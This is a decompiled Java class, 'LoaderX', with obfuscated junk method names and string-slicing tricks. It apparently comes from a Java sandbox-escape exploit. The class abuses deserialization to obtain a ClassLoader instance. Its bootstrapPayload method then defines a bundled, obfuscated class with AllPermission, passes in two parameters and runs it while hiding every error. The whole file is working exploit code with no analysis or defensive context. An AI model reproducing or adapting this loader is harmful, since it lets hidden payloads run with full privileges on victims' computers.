// 
// Decompiled by Procyon v0.5.30
// 

package myf.y;

import java.lang.reflect.Field;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class LoaderX extends ClassLoader implements Serializable
{
    private static final long serialVersionUID = 6812622870313961944L;
    public static LoaderX instance;
    
    public void jxmutaeralsdmqelzoehxtvwbcs(final String s) {
    }
    
    public void yycoxlwaktkwgxhu(final String s) {
    }
    
    public void ldlazjexnksmnihnys(final String s) {
    }
    
    public void nonthdnrtzgavukdzo(final String s) {
    }
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    public void oxjicsomaeydujsej(final String s) {
    }
    
    public void htqkgltjyxmuoksrqq(final String s) {
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        LoaderX.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void ncokctcxovknboiedqfi(final String s) {
    }
    
    public void bootstrapPayload(final String s, final String s2) throws IOException {
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[8192];
            int read;
            while ((read = this.getClass().getResourceAsStream("/myf/y/lmynuvyudsrqgbqtnkakur.class").read(array)) > 0) {
                byteArrayOutputStream.write(array, 0, read);
            }
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            final URL url = new URL("file:///krnxwphapzjrpkmghywo".substring(0, 8));
            final Certificate[] array2 = new Certificate[0];
            final Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            final Class<?> defineClass = this.defineClass("myf.y.lmynuvyudsrqgbqtnkakur", byteArray, 0, byteArray.length, new ProtectionDomain(new CodeSource(url, array2), permissions));
            if (defineClass == null) {
                return;
            }
            final Field field = defineClass.getField("databqmutdijbquihsywjhjroueaug".substring(0, 4));
            final Field field2 = defineClass.getField("ccphdvqajjvglqkvigcdmicaxletbrmg".substring(0, 2));
            final Object instance = defineClass.newInstance();
            field.set(instance, s);
            field2.set(instance, s2);
            defineClass.newInstance();
        }
        catch (Exception ex) {}
    }
    
    static {
        LoaderX.instance = null;
    }
}
